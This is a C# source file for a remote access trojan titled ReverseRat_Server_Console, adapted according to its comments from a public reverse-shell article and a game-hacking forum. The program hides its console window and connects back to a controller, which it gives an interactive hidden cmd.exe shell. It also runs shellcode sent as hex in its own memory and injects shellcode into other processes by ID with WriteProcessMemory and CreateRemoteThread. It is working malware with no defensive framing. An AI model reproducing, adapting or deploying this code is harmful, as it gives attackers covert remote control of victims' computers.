using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.IO;            //for Streams
using System.Diagnostics;   //for Process
using System.Linq;
using System.Text;
using System.Data;

//Process injection take from http://www.ownedcore.com/forums/world-of-warcraft/world-of-warcraft-bots-programs/wow-memory-editing/422280-c-asm-injection-createremotethread.html
//Reverse Connection server by Paul Chin
//original version taken from http://www.codeproject.com/Articles/20250/Reverse-Connection-Shell
namespace ReverseRat_Server_Console
{
    class Program
    {
        TcpClient tcpClient;
        NetworkStream networkStream;
        StreamWriter streamWriter;
        StreamReader streamReader;
        Process processCmd;
        StringBuilder strInput;

        //For shellcode injection
        [DllImport("kernel32")]
        private static extern UInt32 VirtualAlloc(UInt32 JWmoIlFhPkGN, UInt32 UzWUXeiqddon, UInt32 szYzablY, UInt32 GXqpQXZYHpUiQ);
        [DllImport("kernel32")]
        private static extern IntPtr CreateThread(UInt32 cfYPJVtsoTj, UInt32 BzaNozPQLx, UInt32 YcjYxbv, IntPtr FmjdKEI, UInt32 WalIOQWiqTD, ref UInt32 VmRrcdmoX);
        [DllImport("kernel32")]
        private static extern UInt32 WaitForSingleObject(IntPtr xGtvlmms, UInt32 TgXuJhLpycZ);

        //For Process injection
        [DllImport("kernel32.dll")]
        public static extern IntPtr OpenProcess(ProcessAccessFlags dwDesiredAccess, bool bInheritHandle, int dwProcessId);
        [DllImport("kernel32.dll")]
        public static extern bool CloseHandle(IntPtr hObject);
        [DllImport("kernel32.dll")]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);
        [DllImport("kernel32.dll")]
        public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, AllocationType flAllocationType, MemoryProtection flProtect);
        [DllImport("kernel32.dll")]
        public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);

        //for hidden window
        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        [DllImport("Kernel32")]
        private static extern IntPtr GetConsoleWindow();

        const int SW_HIDE = 0;
        const int SW_SHOW = 5;

        [Flags]
        public enum ProcessAccessFlags : uint
        {
            Terminate = 0x00000001,
            CreateThread = 0x00000002,
            VMOperation = 0x00000008,
            VMRead = 0x00000010,
            VMWrite = 0x00000020,
            DupHandle = 0x00000040,
            SetInformation = 0x00000200,
            QueryInformation = 0x00000400,
            Synchronize = 0x00100000,
            All = 0x001F0FFF
        }

        [Flags]
        public enum AllocationType
        {
            Commit = 0x00001000,
            Reserve = 0x00002000,
            Decommit = 0x00004000,
            Release = 0x00008000,
            Reset = 0x00080000,
            TopDown = 0x00100000,
            WriteWatch = 0x00200000,
            Physical = 0x00400000,
            LargePages = 0x20000000
        }

        [Flags]
        public enum MemoryProtection
        {
            NoAccess = 0x0001,
            ReadOnly = 0x0002,
            ReadWrite = 0x0004,
            WriteCopy = 0x0008,
            Execute = 0x0010,
            ExecuteRead = 0x0020,
            ExecuteReadWrite = 0x0040,
            ExecuteWriteCopy = 0x0080,
            GuardModifierflag = 0x0100,
            NoCacheModifierflag = 0x0200,
            WriteCombineModifierflag = 0x0400
        }

        static void Main(string[] args)
        {
            //for hidden window
            IntPtr hwnd;
            hwnd = GetConsoleWindow();
            ShowWindow(hwnd, SW_HIDE);

            Program p = new Program();
            p.RunServer();
            System.Threading.Thread.Sleep(5000); //Wait 5 seconds
        }

        private void RunServer()
        {
            tcpClient = new TcpClient();
            strInput = new StringBuilder();
            if (!tcpClient.Connected)
            {
                try
                {
                    tcpClient.Connect("localhost", 6666);
                    networkStream = tcpClient.GetStream();
                    streamReader = new StreamReader(networkStream);
                    streamWriter = new StreamWriter(networkStream);
                }
                catch (Exception err) { return; } //if no Client don't continue

                processCmd = new Process();
                processCmd.StartInfo.FileName = "cmd.exe";
                processCmd.StartInfo.CreateNoWindow = true;
                processCmd.StartInfo.UseShellExecute = false;
                processCmd.StartInfo.RedirectStandardOutput = true;
                processCmd.StartInfo.RedirectStandardInput = true;
                processCmd.StartInfo.RedirectStandardError = true;
                processCmd.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
                processCmd.Start();
                processCmd.BeginOutputReadLine();
            }
            while (true)
            {
                try
                {
                    strInput.Append(streamReader.ReadLine());
                    if (strInput.ToString().StartsWith("shellcode")) ExecShellCode(strInput.ToString());
                    if (strInput.ToString().StartsWith("processinject")) ProcessInjection(strInput.ToString());
                    strInput.Append("\n");
                    if (strInput.ToString().LastIndexOf("terminate") >= 0) StopServer();
                    if (strInput.ToString().LastIndexOf("exit") >= 0) throw new ArgumentException();
                    processCmd.StandardInput.WriteLine(strInput);
                    strInput.Remove(0, strInput.Length);
                }
                catch (Exception err)
                {
                    Cleanup();
                    break;
                }
            }
        }

        private void ExecShellCode(String input)
        {
            //User input below
            //shellcode {shellcode}
            string[] lines = input.Split(new string[] { " " }, StringSplitOptions.None);
            string strShellCode = InputToByteArrayString(lines[1]);                        
            byte[] shellcode = StringToByteArray(strShellCode);

            UInt32 memHandle = VirtualAlloc(0, (UInt32)shellcode.Length, 0x1000, 0x40);
            Marshal.Copy(shellcode, 0, (IntPtr)(memHandle), shellcode.Length);
            IntPtr thead_handle = IntPtr.Zero; UInt32 rando = 0; IntPtr rando2 = IntPtr.Zero;
            thead_handle = CreateThread(0, 0, memHandle, rando2, 0, ref rando);
            WaitForSingleObject(thead_handle, 0xFFFFFFFF);
        }

        private void ProcessInjection(String input)
        {
            //User input below
            //processinject {shellcode} {PID}
            string[] lines = input.Split(new string[] { " " }, StringSplitOptions.None);
            string strShellCode = InputToByteArrayString(lines[1]);
            byte[] shellCode = StringToByteArray(strShellCode);

            //Ensure to use 64-bit shell code for 64-bit processes and 32bit shell code for 32bit processes
            int iProcessId = Convert.ToInt32(lines[2]);
            IntPtr hHandle = OpenProcess(ProcessAccessFlags.All, false, iProcessId);

            if (hHandle == IntPtr.Zero)
                throw new ApplicationException("Cannot get process handle.");

            IntPtr hAlloc = VirtualAllocEx(hHandle, IntPtr.Zero, (uint)shellCode.Length, AllocationType.Commit, MemoryProtection.ExecuteReadWrite);

            if (hAlloc == IntPtr.Zero)
                throw new ApplicationException("Cannot allocate memory.");

            UIntPtr bytesWritten = UIntPtr.Zero;

            if (!WriteProcessMemory(hHandle, hAlloc, shellCode, (uint)shellCode.Length, out bytesWritten))
                throw new ApplicationException("Cannot write process memory.");

            if (shellCode.Length != (int)bytesWritten)
                throw new ApplicationException("Invalid written size.");

            uint iThreadId = 0;
            IntPtr hThread = CreateRemoteThread(hHandle, IntPtr.Zero, 0, hAlloc, IntPtr.Zero, 0, out iThreadId);

            if (hThread == IntPtr.Zero)
                throw new ApplicationException("Cannot create and execute remote thread.");

            CloseHandle(hThread);
            CloseHandle(hHandle);
        }

        public static string InputToByteArrayString(string input)
        {
            string strShellCode = input.Replace("0x", "");
            strShellCode = strShellCode.Replace(",", "");
            return strShellCode;
        }

        public static byte[] StringToByteArray(String hex)
        {
            int NumberChars = hex.Length;
            byte[] bytes = new byte[NumberChars / 2];
            for (int i = 0; i < NumberChars; i += 2)
                bytes[i / 2] = Convert.ToByte(hex.Substring(i, 2), 16);
            return bytes;
        }

        public static string ByteArrayToString(byte[] ba)
        {
            StringBuilder hex = new StringBuilder(ba.Length * 2);
            foreach (byte b in ba)
                hex.AppendFormat("{0:x2}", b);
            return hex.ToString();
        }

        private void Cleanup()
        {
            try { processCmd.Kill(); }
            catch (Exception err) { };
            streamReader.Close();
            streamWriter.Close();
            networkStream.Close();
        }

        private void StopServer()
        {
            Cleanup();
            System.Environment.Exit(System.Environment.ExitCode);
        }

        private void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }

            }
        }
    }
}
